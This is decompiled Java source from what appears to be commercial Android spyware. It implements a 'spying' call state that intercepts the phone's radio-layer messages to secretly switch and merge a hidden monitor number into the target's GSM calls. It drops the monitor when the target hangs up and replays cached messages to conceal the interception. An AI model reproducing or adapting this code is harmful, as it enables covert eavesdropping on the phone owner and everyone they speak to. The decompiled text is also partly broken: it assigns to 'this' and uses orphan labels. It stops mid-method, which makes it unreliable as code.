package com.vvt.callmanager.filter;

import android.os.Parcel;
import android.os.SystemClock;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.f;
import com.vvt.e.b;
import java.util.ArrayList;
import java.util.Iterator;

 enum FilterGsmCall$CallState$8
{
  private byte[][] cacheRequest;
  private byte[] cacheUnsol;
  private ArrayList callList;
  private boolean isLgStateInProgress;
  private boolean isMerging;
  private boolean isReleasingMonitor;
  private boolean isReleasingMonitorResponded;
  private boolean isStateChanged;
  private boolean isSwitching;
  private boolean isSwitchingResponded;
  private ArrayList lgStateInfo;
  private d monitorCallInfo;
  private boolean targetIsDialing;
  private Object transition;
  
  FilterGsmCall$CallState$8()
  {
    super(paramString, paramInt, null);
  }
  
  private void a()
  {
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    m localm = FilterGsmCall.c(this.mFilterCall);
    i.d(localFilterGsmCall, localm);
    this.isReleasingMonitor = true;
  }
  
  private void a(int paramInt)
  {
    boolean bool = true;
    Object localObject1 = this.monitorCallInfo;
    int i = ((d)localObject1).a();
    Object localObject2 = this.mFilterCall;
    Object[] arrayOfObject = new Object[bool];
    Integer localInteger = Integer.valueOf(i);
    arrayOfObject[0] = localInteger;
    Object localObject3 = String.format("Releasing monitor: index=%d", arrayOfObject);
    FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject3);
    switch (paramInt)
    {
    }
    for (;;)
    {
      this.isReleasingMonitor = bool;
      this.isReleasingMonitorResponded = false;
      return;
      localObject2 = this.mFilterCall;
      localObject3 = FilterGsmCall.c(this.mFilterCall);
      i.a(i, (n)localObject2, (m)localObject3);
      continue;
      localObject1 = this.mFilterCall;
      localObject2 = FilterGsmCall.c(this.mFilterCall);
      i.b((n)localObject1, (m)localObject2);
      continue;
      localObject1 = this.mFilterCall;
      localObject2 = FilterGsmCall.c(this.mFilterCall);
      i.d((n)localObject1, (m)localObject2);
    }
  }
  
  private void a(Parcel paramParcel)
  {
    int i = 2;
    int j = 0;
    Object localObject1 = null;
    int k = 1;
    Object localObject2 = this.mFilterCall;
    Object localObject3 = "manageSwitching # ENTER ...";
    FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject3);
    localObject2 = this.monitorCallInfo;
    int m = ((d)localObject2).c();
    boolean bool2 = c();
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    Object[] arrayOfObject = new Object[i];
    Object localObject4 = Integer.valueOf(m);
    arrayOfObject[0] = localObject4;
    localObject4 = Boolean.valueOf(bool2);
    arrayOfObject[k] = localObject4;
    String str = String.format("manageSwitching # monitorState: %d, isThirdPartyOnHold: %s", arrayOfObject);
    FilterGsmCall.a(localFilterGsmCall, str);
    if ((m == 0) && (bool2))
    {
      localObject2 = this.mFilterCall;
      localObject3 = "manageSwitching # Switching SUCCESS! -> Try merging";
      FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject3);
      boolean bool1 = b.a();
      if (bool1)
      {
        bool1 = com.vvt.e.a.a();
        if (bool1) {
          j = k;
        }
      }
      if (j != 0)
      {
        long l = 500L;
        SystemClock.sleep(l);
      }
      localObject1 = i.a(i.h);
      FilterGsmCall.c(this.mFilterCall).a((Parcel)localObject1);
      localObject2 = this.mFilterCall;
      ((FilterGsmCall)localObject2).d((Parcel)localObject1);
      this.isMerging = k;
    }
    for (;;)
    {
      FilterGsmCall.a(this.mFilterCall, "manageSwitching # EXIT ...");
      return;
      if (!bool2) {
        break;
      }
      localObject2 = this.mFilterCall;
      localObject3 = "manageSwitching # Switching not complete! -> Wait";
      FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject3);
      this.isSwitching = k;
      this.isSwitchingResponded = k;
      this.isStateChanged = false;
    }
    Object localObject5 = this.mFilterCall;
    localObject2 = "manageSwitching # Switching FAILED!!";
    FilterGsmCall.a((FilterGsmCall)localObject5, (String)localObject2);
    if (bool2)
    {
      FilterGsmCall.a(this.mFilterCall, "manageSwitching # Re-switching after monitor is released");
      localObject5 = this.cacheRequest;
      localObject2 = i.g;
      localObject5[0] = localObject2;
      a(i);
    }
    for (;;)
    {
      localObject1 = this.mFilterCall;
      localObject5 = new com/vvt/callmanager/ref/MonitorDisconnectData;
      localObject2 = this.monitorCallInfo.d();
      localObject3 = MonitorDisconnectData.Reason.BAD_STATE;
      ((MonitorDisconnectData)localObject5).<init>((String)localObject2, (MonitorDisconnectData.Reason)localObject3);
      FilterGsmCall.a((FilterGsmCall)localObject1, (MonitorDisconnectData)localObject5);
      break;
      j = 3;
      a(j);
    }
  }
  
  private void a(Object paramObject)
  {
    int i = 1;
    float f1 = Float.MIN_VALUE;
    int j = 0;
    Object localObject1 = null;
    Object localObject2 = this.mFilterCall;
    Object localObject3 = "initialize # ENTER ...";
    FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject3);
    int n;
    int m;
    float f2;
    float f3;
    if (paramObject != null)
    {
      boolean bool1 = paramObject instanceof ArrayList;
      if (bool1)
      {
        paramObject = (ArrayList)paramObject;
        this.callList = ((ArrayList)paramObject);
        localObject2 = this.mFilterCall;
        localObject3 = this.callList;
        localObject2 = FilterGsmCall.c((FilterGsmCall)localObject2, (ArrayList)localObject3);
        n = ((ArrayList)localObject2).size();
        if (n <= 0) {
          break label503;
        }
        localObject2 = (d)((ArrayList)localObject2).get(0);
        this.monitorCallInfo = ((d)localObject2);
        int k = this.monitorCallInfo.a();
        localObject3 = this.monitorCallInfo;
        n = ((d)localObject3).c();
        Object localObject4 = this.mFilterCall;
        String str = "Monitor Info: index=%d, state=%d";
        int i1 = 2;
        Object[] arrayOfObject = new Object[i1];
        localObject2 = Integer.valueOf(k);
        arrayOfObject[0] = localObject2;
        localObject2 = Integer.valueOf(n);
        arrayOfObject[i] = localObject2;
        localObject2 = String.format(str, arrayOfObject);
        FilterGsmCall.a((FilterGsmCall)localObject4, (String)localObject2);
        localObject2 = FilterGsmCall.d(this.mFilterCall);
        localObject4 = this.monitorCallInfo.d();
        localObject2 = ((f)localObject2).b((String)localObject4);
        if (localObject2 == null) {
          break label375;
        }
        boolean bool2 = ((MonitorNumber)localObject2).isEnabled();
        if (!bool2) {
          break label375;
        }
        m = ((MonitorNumber)localObject2).isCallInterceptEnabled();
        if (m == 0) {
          break label375;
        }
        m = i;
        f2 = f1;
        bool2 = b();
        if (!bool2) {
          break label387;
        }
        int i2 = 5;
        if (n != i2) {
          break label387;
        }
        n = i;
        f3 = f1;
        label276:
        if ((m != 0) && (n != 0)) {
          j = i;
        }
        int i3 = n;
        float f4 = f3;
        n = m;
        f3 = f2;
        m = i3;
        f2 = f4;
      }
    }
    for (;;)
    {
      if (j != 0)
      {
        FilterGsmCall.a(this.mFilterCall, "Try switching calls");
        localObject2 = i.a(i.g);
        FilterGsmCall.c(this.mFilterCall).a((Parcel)localObject2);
        localObject1 = this.mFilterCall;
        ((FilterGsmCall)localObject1).d((Parcel)localObject2);
        this.isSwitching = i;
        FilterGsmCall.a(this.mFilterCall, "initialize # EXIT ...");
        return;
        label375:
        m = 0;
        localObject2 = null;
        f2 = 0.0F;
        break;
        label387:
        n = 0;
        localObject3 = null;
        f3 = 0.0F;
        break label276;
      }
      Object localObject5;
      if (n == 0)
      {
        localObject2 = this.mFilterCall;
        localObject5 = "Call Intercept is NOT allowed!!";
        FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject5);
      }
      for (;;)
      {
        FilterGsmCall.a(this.mFilterCall, "Release waiting monitor");
        a();
        localObject2 = this.mFilterCall;
        localObject5 = new com/vvt/callmanager/ref/MonitorDisconnectData;
        localObject1 = this.monitorCallInfo.d();
        localObject3 = MonitorDisconnectData.Reason.BAD_STATE;
        ((MonitorDisconnectData)localObject5).<init>((String)localObject1, (MonitorDisconnectData.Reason)localObject3);
        FilterGsmCall.a((FilterGsmCall)localObject2, (MonitorDisconnectData)localObject5);
        break;
        if (m == 0)
        {
          localObject2 = this.mFilterCall;
          localObject5 = "Phone state is NOT ready!!";
          FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject5);
        }
      }
      label503:
      m = 0;
      localObject2 = null;
      f2 = 0.0F;
      n = 0;
      localObject3 = null;
      f3 = 0.0F;
    }
  }
  
  private boolean a(boolean paramBoolean)
  {
    Object localObject = this.callList;
    int i;
    String str;
    if (localObject != null)
    {
      localObject = this.callList;
      i = ((ArrayList)localObject).size();
      int m = 2;
      if (i >= m) {}
    }
    else
    {
      localObject = this.mFilterCall;
      str = "Call list is incorrect!!";
      FilterGsmCall.a((FilterGsmCall)localObject, str);
      i = 0;
      localObject = null;
    }
    for (;;)
    {
      return i;
      int n = 1;
      Iterator localIterator;
      d locald;
      int i1;
      int i2;
      if (paramBoolean)
      {
        localObject = this.callList;
        localIterator = ((ArrayList)localObject).iterator();
        do
        {
          do
          {
            boolean bool1 = localIterator.hasNext();
            if (!bool1) {
              break label268;
            }
            localObject = (d)localIterator.next();
            locald = this.monitorCallInfo;
            if (locald == null) {
              break;
            }
            locald = this.monitorCallInfo;
            i1 = locald.a();
            i2 = ((d)localObject).a();
          } while (i1 == i2);
          if (localObject == null) {
            break;
          }
          j = ((d)localObject).c();
        } while (j == 0);
        localObject = this.mFilterCall;
        str = "Some 3rd party are NOT active!!";
        FilterGsmCall.a((FilterGsmCall)localObject, str);
        int j = 0;
        localObject = null;
      }
      else
      {
        localObject = this.callList;
        localIterator = ((ArrayList)localObject).iterator();
        do
        {
          do
          {
            boolean bool2 = localIterator.hasNext();
            if (!bool2) {
              break label268;
            }
            localObject = (d)localIterator.next();
            locald = this.monitorCallInfo;
            if (locald == null) {
              break;
            }
            locald = this.monitorCallInfo;
            i1 = locald.a();
            i2 = ((d)localObject).a();
          } while (i1 == i2);
          if (localObject == null) {
            break;
          }
          k = ((d)localObject).c();
        } while (k != 0);
        localObject = this.mFilterCall;
        str = "Some 3rd party are still active!!";
        FilterGsmCall.a((FilterGsmCall)localObject, str);
        int k = 0;
        localObject = null;
        continue;
        label268:
        k = n;
      }
    }
  }
  
  private void b(Parcel paramParcel)
  {
    int i = 2;
    Object localObject1 = this.mFilterCall;
    Object localObject2 = "manageMerging # ENTER ...";
    FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
    localObject1 = this.monitorCallInfo;
    int j = ((d)localObject1).c();
    boolean bool = b();
    Object localObject3 = this.mFilterCall;
    Object[] arrayOfObject = new Object[i];
    Integer localInteger = Integer.valueOf(j);
    arrayOfObject[0] = localInteger;
    int k = 1;
    Boolean localBoolean = Boolean.valueOf(bool);
    arrayOfObject[k] = localBoolean;
    Object localObject4 = String.format("manageMerging # monitorState: %d, isThirdPartyActive: %s", arrayOfObject);
    FilterGsmCall.a((FilterGsmCall)localObject3, (String)localObject4);
    if ((j == 0) && (bool))
    {
      localObject1 = this.mFilterCall;
      localObject2 = "manageMerging # Merging SUCCESS!";
      FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
      FilterGsmCall.a(this.mFilterCall, "manageMerging # EXIT ...");
      return;
    }
    localObject1 = this.mFilterCall;
    localObject3 = "manageMerging # Merging FAILED!!";
    FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject3);
    if (!bool)
    {
      FilterGsmCall.a(this.mFilterCall, "manageSwitching # Re-switching after monitor is released");
      localObject1 = this.cacheRequest;
      localObject2 = i.g;
      localObject1[0] = localObject2;
      a(i);
    }
    for (;;)
    {
      localObject1 = this.mFilterCall;
      localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
      localObject3 = this.monitorCallInfo.d();
      localObject4 = MonitorDisconnectData.Reason.BAD_STATE;
      ((MonitorDisconnectData)localObject2).<init>((String)localObject3, (MonitorDisconnectData.Reason)localObject4);
      FilterGsmCall.a((FilterGsmCall)localObject1, (MonitorDisconnectData)localObject2);
      break;
      j = 3;
      a(j);
    }
  }
  
  private boolean b()
  {
    return a(true);
  }
  
  private FilterGsmCall.CallState c(Parcel paramParcel)
  {
    Object localObject1 = this.callList;
    float f1;
    int m;
    Object localObject2;
    Object localObject3;
    int n;
    Object localObject4;
    int i1;
    float f2;
    int i2;
    float f3;
    int i3;
    float f4;
    int i4;
    float f5;
    int i6;
    float f6;
    Object localObject5;
    label129:
    Object localObject6;
    String str;
    int i7;
    if (localObject1 == null)
    {
      boolean bool1 = false;
      f1 = 0.0F;
      localObject1 = null;
      m = 0;
      localObject2 = null;
      localObject1 = this.mFilterCall;
      localObject3 = this.callList;
      n = FilterGsmCall.c((FilterGsmCall)localObject1, (ArrayList)localObject3).size();
      localObject1 = d.a(paramParcel);
      this.callList = ((ArrayList)localObject1);
      localObject3 = this.callList;
      localObject4 = FilterGsmCall.c(this.mFilterCall).a();
      i.a("FilterCall", (ArrayList)localObject3, (com.vvt.callmanager.mitm.a)localObject4);
      i1 = 0;
      f2 = 0.0F;
      i2 = 0;
      f3 = 0.0F;
      i3 = 0;
      f4 = 0.0F;
      i4 = 0;
      f5 = 0.0F;
      localObject4 = null;
      i6 = 0;
      f6 = 0.0F;
      localObject3 = null;
      localObject1 = this.callList;
      localObject5 = ((ArrayList)localObject1).iterator();
      bool1 = ((Iterator)localObject5).hasNext();
      if (!bool1) {
        break label405;
      }
      localObject1 = (d)((Iterator)localObject5).next();
      localObject6 = FilterGsmCall.d(this.mFilterCall);
      str = ((d)localObject1).d();
      boolean bool4 = ((f)localObject6).a(str);
      if (!bool4) {
        break label329;
      }
      i7 = ((d)localObject1).c();
      if (i7 != 0) {
        break label283;
      }
      Object localObject7 = localObject3;
      localObject3 = localObject1;
      localObject1 = localObject7;
      int i8 = i3;
      float f7 = f4;
      i3 = i2;
      f4 = f3;
      i2 = 1;
      f3 = Float.MIN_VALUE;
      i4 = i8;
      f5 = f7;
    }
    for (;;)
    {
      i1 = i2;
      f2 = f3;
      i2 = i3;
      f3 = f4;
      i3 = i4;
      f4 = f5;
      localObject4 = localObject3;
      localObject3 = localObject1;
      break label129;
      localObject1 = this.callList;
      int i = ((ArrayList)localObject1).size();
      m = i;
      break;
      label283:
      i6 = 1;
      f6 = Float.MIN_VALUE;
      i2 = i1;
      f3 = f2;
      int i9 = i3;
      float f8 = f4;
      i3 = i6;
      f4 = f6;
      localObject3 = localObject4;
      i4 = i9;
      f5 = f8;
      continue;
      label329:
      i7 = ((d)localObject1).c();
      int i10 = 4;
      if (i7 != i10)
      {
        i = ((d)localObject1).c();
        i7 = 5;
        if (i != i7) {}
      }
      else
      {
        i = 1;
        f1 = Float.MIN_VALUE;
        i3 = i2;
        f4 = f3;
        i2 = i1;
        f3 = f2;
        i9 = i;
        f8 = f1;
        localObject1 = localObject3;
        localObject3 = localObject4;
        i4 = i;
        f5 = f1;
        continue;
        label405:
        localObject1 = this.mFilterCall;
        i7 = 3;
        localObject6 = new Object[i7];
        str = null;
        Boolean localBoolean = Boolean.valueOf(i1);
        localObject6[0] = localBoolean;
        localBoolean = Boolean.valueOf(i2);
        localObject6[1] = localBoolean;
        i10 = 2;
        localBoolean = Boolean.valueOf(i3);
        localObject6[i10] = localBoolean;
        localObject5 = String.format("activeMonitor: %s, waitingMonitor: %s, waitingNormal: %s", (Object[])localObject6);
        FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject5);
        if (i1 != 0)
        {
          this.monitorCallInfo = ((d)localObject4);
          localObject1 = this.callList;
          if (localObject1 != null) {
            break label718;
          }
          i = 0;
          f1 = 0.0F;
          localObject1 = null;
          i6 = 0;
          localObject3 = null;
          f6 = 0.0F;
          label518:
          if ((i1 == 0) && (i2 == 0)) {
            break label734;
          }
          i = 1;
          f1 = Float.MIN_VALUE;
          label534:
          i4 = this.isReleasingMonitor;
          if (i4 == 0) {
            break label929;
          }
          i4 = this.isReleasingMonitorResponded;
          if ((i4 == 0) || (i != 0)) {
            break label929;
          }
          localObject1 = this.mFilterCall;
          localObject2 = "Monitor is completely released";
          FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
          if (i3 != 0)
          {
            localObject1 = this.mFilterCall;
            localObject2 = "Forward cached ringing messages";
            FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
            localObject1 = this.lgStateInfo;
            bool2 = ((ArrayList)localObject1).isEmpty();
            if (bool2) {
              break label744;
            }
            localObject1 = this.mFilterCall;
            localObject2 = this.lgStateInfo;
            FilterGsmCall.b((FilterGsmCall)localObject1, (ArrayList)localObject2);
          }
          label628:
          localObject1 = this.cacheUnsol;
          if (localObject1 != null)
          {
            if (i1 == 0) {
              break label776;
            }
            bool2 = false;
            f1 = 0.0F;
            localObject1 = null;
            this.cacheUnsol = null;
          }
          label654:
          localObject1 = this.cacheRequest;
          if (localObject1 != null)
          {
            if (i1 == 0) {
              break label809;
            }
            bool2 = false;
            f1 = 0.0F;
            localObject1 = (byte[][])null;
            this.cacheRequest = null;
          }
          this.isReleasingMonitor = false;
          boolean bool2 = false;
          f1 = 0.0F;
          localObject1 = null;
          this.isReleasingMonitorResponded = false;
          if (i3 == 0) {
            break label889;
          }
          this = OFFHOOK_RINGING;
        }
        for (;;)
        {
          return this;
          localObject4 = localObject3;
          break;
          label718:
          localObject1 = this.callList;
          int j = ((ArrayList)localObject1).size();
          i6 = j;
          break label518;
          label734:
          j = 0;
          f1 = 0.0F;
          localObject1 = null;
          break label534;
          label744:
          localObject1 = this.mFilterCall;
          localObject2 = this.cacheUnsol;
          i.a((n)localObject1, (byte[])localObject2);
          j = 0;
          f1 = 0.0F;
          localObject1 = null;
          this.cacheUnsol = null;
          break label628;
          label776:
          FilterGsmCall.a(this.mFilterCall, "Forward cached unsolicited response");
          localObject1 = this.mFilterCall;
          localObject2 = i.a(this.cacheUnsol);
          ((FilterGsmCall)localObject1).c((Parcel)localObject2);
          break label654;
          label809:
          localObject1 = this.mFilterCall;
          localObject2 = "Forward cached ril request";
          FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
          j = 0;
          f1 = 0.0F;
          localObject1 = null;
          for (;;)
          {
            localObject2 = this.cacheRequest;
            m = localObject2.length;
            if (j >= m) {
              break;
            }
            localObject2 = this.cacheRequest[j];
            if (localObject2 != null)
            {
              localObject4 = this.mFilterCall;
              localObject2 = i.a((byte[])localObject2);
              ((FilterGsmCall)localObject4).d((Parcel)localObject2);
            }
            j += 1;
          }
          label889:
          boolean bool3 = this.targetIsDialing;
          if (bool3)
          {
            this = OFFHOOK_DIALING;
          }
          else if (i6 == 0)
          {
            this = IDLE;
          }
          else
          {
            this.transition = paramParcel;
            this = OFFHOOK;
            continue;
            label929:
            localObject1 = this.callList;
            int k;
            if (localObject1 != null)
            {
              localObject1 = this.callList;
              k = ((ArrayList)localObject1).size();
              if (k != 0) {}
            }
            else
            {
              localObject1 = this.mFilterCall;
              localObject2 = "There are no calls -> Go IDLE";
              FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
              this = IDLE;
              continue;
            }
            if (i3 != 0)
            {
              localObject1 = this.callList;
              k = ((ArrayList)localObject1).size();
              i5 = 2;
              f5 = 2.8E-45F;
              if (k > i5)
              {
                FilterGsmCall.a(this.mFilterCall, "Found waiting call!!");
                k = 1;
                f1 = Float.MIN_VALUE;
                a(k);
                localObject1 = this.mFilterCall;
                localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
                localObject3 = this.monitorCallInfo.d();
                localObject4 = MonitorDisconnectData.Reason.CALL_WAITING;
                ((MonitorDisconnectData)localObject2).<init>((String)localObject3, (MonitorDisconnectData.Reason)localObject4);
                FilterGsmCall.a((FilterGsmCall)localObject1, (MonitorDisconnectData)localObject2);
                continue;
              }
            }
            if ((i1 != 0) && (i2 != 0))
            {
              localObject1 = this.mFilterCall;
              localObject2 = "Reject waiting monitor";
              FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
              a();
            }
            else if (m > i6)
            {
              localObject1 = this.mFilterCall;
              localObject2 = "Someone is missing!";
              FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
              localObject1 = this.monitorCallInfo;
              if (localObject1 == null)
              {
                localObject1 = this.mFilterCall;
                localObject2 = "Monitor is gone -> Go OFFHOOK";
                FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
                this.transition = paramParcel;
                this = OFFHOOK;
              }
              else
              {
                k = 1;
                f1 = Float.MIN_VALUE;
                if (n > k)
                {
                  localObject1 = this.mFilterCall;
                  localObject2 = "2nd monitor is rejected -> Continue";
                  FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
                  this = OFFHOOK_SPYING;
                }
                else
                {
                  FilterGsmCall.a(this.mFilterCall, "3rd party is gone!!");
                  localObject1 = i.n;
                  this.cacheUnsol = ((byte[])localObject1);
                  k = 1;
                  f1 = Float.MIN_VALUE;
                  a(k);
                  localObject1 = this.mFilterCall;
                  localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
                  localObject3 = this.monitorCallInfo.d();
                  localObject4 = MonitorDisconnectData.Reason.PARTY_LEFT;
                  ((MonitorDisconnectData)localObject2).<init>((String)localObject3, (MonitorDisconnectData.Reason)localObject4);
                  FilterGsmCall.a((FilterGsmCall)localObject1, (MonitorDisconnectData)localObject2);
                }
              }
            }
          }
        }
      }
      localObject1 = localObject3;
      localObject3 = localObject4;
      int i5 = i3;
      f5 = f4;
      i3 = i2;
      f4 = f3;
      i2 = i1;
      f3 = f2;
    }
  }
  
  private boolean c()
  {
    return a(false);
  }
  
  public void onEnter(Object paramObject)
  {
    BugEngineCallState localBugEngineCallState = null;
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.a(this.mFilterCall);
    this.targetIsDialing = false;
    this.isReleasingMonitor = false;
    this.isSwitching = false;
    this.isMerging = false;
    this.isStateChanged = false;
    this.isSwitchingResponded = false;
    this.isLgStateInProgress = false;
    this.isReleasingMonitorResponded = false;
    int i = 3;
    Object localObject = new byte[i][];
    this.cacheRequest = ((byte[][])localObject);
    this.cacheUnsol = null;
    this.monitorCallInfo = null;
    this.callList = null;
    localObject = this.lgStateInfo;
    if (localObject == null)
    {
      localObject = new java/util/ArrayList;
      ((ArrayList)localObject).<init>();
      this.lgStateInfo = ((ArrayList)localObject);
    }
    this.lgStateInfo.clear();
    a(paramObject);
    localObject = this.mFilterCall;
    localBugEngineCallState = BugEngineCallState.GSM_OFFHOOK_SPYING;
    FilterGsmCall.a((FilterGsmCall)localObject, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.b(this.mFilterCall);
    return this.transition;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    boolean bool1 = true;
    int i = 0;
    FilterGsmCall localFilterGsmCall = null;
    Object localObject1 = FilterGsmCall.c(this.mFilterCall);
    int j = ((m)localObject1).c(paramParcel);
    int i1 = 1001;
    int k;
    Object localObject2;
    Object localObject3;
    Object localObject4;
    if (j == i1)
    {
      localObject1 = this.lgStateInfo;
      k = ((ArrayList)localObject1).isEmpty();
      if (k == 0)
      {
        localObject1 = this.lgStateInfo;
        localObject2 = paramParcel.marshall();
        ((ArrayList)localObject1).add(localObject2);
      }
      localObject1 = this.lgStateInfo;
      k = ((ArrayList)localObject1).isEmpty();
      if (k == 0)
      {
        localObject1 = this.mFilterCall;
        localObject2 = this.callList;
        localObject3 = this.lgStateInfo;
        k = FilterGsmCall.a((FilterGsmCall)localObject1, (ArrayList)localObject2, (ArrayList)localObject3);
        if (k == 0) {}
      }
      else
      {
        k = this.isLgStateInProgress;
        if (k == 0) {
          break label291;
        }
        localObject1 = this.mFilterCall;
        localObject2 = "LG state info is collected successfully";
        FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
        this.isLgStateInProgress = false;
        localObject1 = this.lgStateInfo;
        ((ArrayList)localObject1).clear();
        k = this.isSwitching;
        if (k != 0)
        {
          k = this.isSwitchingResponded;
          if (k == 0) {
            break label270;
          }
          this.isStateChanged = bool1;
          localObject4 = this.mFilterCall;
          localObject1 = "Switching now cause state changed";
          FilterGsmCall.a((FilterGsmCall)localObject4, (String)localObject1);
        }
        FilterGsmCall.a(this.mFilterCall, "State changed -> Check current calls");
        localObject4 = FilterGsmCall.c(this.mFilterCall);
        localObject1 = this.mFilterCall;
        i.a((m)localObject4, (n)localObject1);
      }
      localObject4 = this;
    }
    for (;;)
    {
      if (i != 0)
      {
        localFilterGsmCall = this.mFilterCall;
        localFilterGsmCall.c(paramParcel);
      }
      return (FilterGsmCall.CallState)localObject4;
      label270:
      localObject4 = this.mFilterCall;
      localObject1 = "Waiting for switching response";
      FilterGsmCall.a((FilterGsmCall)localObject4, (String)localObject1);
      break;
      label291:
      this.isStateChanged = bool1;
      break;
      localObject2 = this.mFilterCall;
      boolean bool3 = FilterGsmCall.a((FilterGsmCall)localObject2, paramParcel, k);
      if (bool3)
      {
        localObject4 = this.lgStateInfo;
        bool1 = ((ArrayList)localObject4).isEmpty();
        if (!bool1)
        {
          localObject4 = this.lgStateInfo;
          localObject1 = paramParcel.marshall();
          ((ArrayList)localObject4).add(localObject1);
        }
        for (;;)
        {
          localObject4 = this;
          break;
          localObject4 = this.mFilterCall;
          localObject1 = "Get incoming call -> Wait for the list";
          FilterGsmCall.a((FilterGsmCall)localObject4, (String)localObject1);
          localObject4 = paramParcel.marshall();
          this.cacheUnsol = ((byte[])localObject4);
        }
      }
      int i2 = 1049;
      if (k == i2)
      {
        this.isLgStateInProgress = bool1;
        localObject4 = this.lgStateInfo;
        localObject1 = paramParcel.marshall();
        ((ArrayList)localObject4).add(localObject1);
        localObject4 = this;
      }
      else
      {
        boolean bool4 = this.isReleasingMonitor;
        if (bool4)
        {
          bool4 = i.a(k);
          if (bool4)
          {
            this.isReleasingMonitorResponded = bool1;
            FilterGsmCall.a(this.mFilterCall, "Receive monitor hangup response");
            FilterGsmCall.a(this.mFilterCall, "Check current calls");
            localObject4 = FilterGsmCall.c(this.mFilterCall);
            localObject1 = this.mFilterCall;
            i.a((m)localObject4, (n)localObject1);
            localObject4 = this;
            continue;
          }
        }
        bool4 = this.isSwitching;
        int m;
        if (bool4)
        {
          int i3 = 15;
          if (k == i3)
          {
            localObject1 = this.mFilterCall;
            localObject2 = "Got switching response -> Wait for state changed";
            FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
            m = this.isLgStateInProgress;
            if (m != 0)
            {
              localObject1 = this.mFilterCall;
              localObject2 = "LG state is in progress -> Waiting ...";
              FilterGsmCall.a((FilterGsmCall)localObject1, (String)localObject2);
            }
            for (;;)
            {
              this.isSwitchingResponded = bool1;
              localObject4 = this;
              break;
              localObject1 = FilterGsmCall.c(this.mFilterCall);
              localObject2 = this.mFilterCall;
              i.a((m)localObject1, (n)localObject2);
            }
          }
        }
        boolean bool5 = this.isMerging;
        int n;
        if (bool5)
        {
          int i4 = 16;
          if (m == i4)
          {
            localObject1 = l.a(paramParcel);
            localObject2 = this.mFilterCall;
            localObject3 = "Got merging response: error=%d";
            localObject4 = new Object[bool1];
            n = ((l)localObject1).c;
            localObject1 = Integer.valueOf(n);
            localObject4[0] = localObject1;
            localObject4 = String.format((String)localObject3, (Object[])localObject4);
            FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject4);
            localObject4 = FilterGsmCall.c(this.mFilterCall);
            localObject1 = this.mFilterCall;
            i.a((m)localObject4, (n)localObject1);
            localObject4 = this;
            continue;
          }
        }
        int i5 = 11010;
        if (n == i5)
        {
          localObject4 = this.mFilterCall;
          localObject1 = "Blocking Samsung magic request ..";
          FilterGsmCall.a((FilterGsmCall)localObject4, (String)localObject1);
          localObject4 = this;
        }
        else
        {
          i5 = 9;
          if (n == i5)
          {
            localObject4 = c(paramParcel);
            localObject1 = OFFHOOK_SPYING;
            if (localObject4 == localObject1)
            {
              boolean bool2 = this.isSwitching;
              if (bool2)
              {
                bool2 = this.isSwitchingResponded;
                if (bool2)
                {
                  bool2 = this.isStateChanged;
                  if (bool2)
                  {
                    this.isSwitching = false;
                    this.isSwitchingResponded = false;
                    this.isStateChanged = false;
                    a(paramParcel);
                    continue;
                  }
                }
              }
              bool2 = this.isMerging;
              if (bool2)
              {
                b(paramParcel);
                this.isMerging = false;
              }
            }
          }
          else
          {
            i = bool1;
            localObject4 = this;
          }
        }
      }
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    int i = 53;
    int j = 4;
    int k = 1;
    int m = 0;
    FilterGsmCall localFilterGsmCall = null;
    Object localObject1 = FilterGsmCall.c(this.mFilterCall);
    int n = ((m)localObject1).b(paramParcel);
    boolean bool2 = i.a(n);
    Object localObject2;
    Object localObject3;
    Object localObject4;
    if (bool2)
    {
      FilterGsmCall.a(this.mFilterCall, "Target is hanging up -> Release monitor");
      localObject1 = this.cacheRequest;
      localObject2 = paramParcel.marshall();
      localObject1[0] = localObject2;
      a(k);
      localObject3 = this.mFilterCall;
      localObject1 = new com/vvt/callmanager/ref/MonitorDisconnectData;
      localObject2 = this.monitorCallInfo.d();
      localObject4 = MonitorDisconnectData.Reason.HANGUP;
      ((MonitorDisconnectData)localObject1).<init>((String)localObject2, (MonitorDisconnectData.Reason)localObject4);
      FilterGsmCall.a((FilterGsmCall)localObject3, (MonitorDisconnectData)localObject1);
    }
    for (;;)
    {
      if (m != 0)
      {
        localFilterGsmCall = this.mFilterCall;
        localFilterGsmCall.d(paramParcel);
      }
      return this;
      int i1 = 15;
      if (n == i1)
      {
        FilterGsmCall.a(this.mFilterCall, "Target is switching calls -> Release monitor");
        localObject1 = this.cacheRequest;
